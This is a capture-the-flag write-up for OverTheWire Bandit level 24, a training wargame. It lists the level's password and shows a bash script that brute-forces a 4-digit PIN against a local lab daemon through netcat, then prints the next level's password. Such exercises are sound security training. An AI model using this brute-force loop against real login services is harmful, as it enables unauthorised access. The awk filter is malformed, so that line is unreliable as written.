# OverTheWire Bandit Level 24

## Credentials
username: bandit24
password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Writeup
First, I used the following command to create a list of all possible 4-digit combinations.

`echo {0..9}{0..9}{0..9}{0..9} > char_list.txt`

Then I created the following bash script `./get24` to print out the possible authentication keys.

```bash
#!/bin/bash

for i in $(cat /tmp/liib24/char_list.txt); 

do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i";

done; 
```
Finally, I used the following command line commands to obtain brute-force the flag.

```
./get24 | nc localhost 30002 | awk '/$1 !~ /^Wrong/ {print $0}'
```

## Flag
Level 25 Password: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
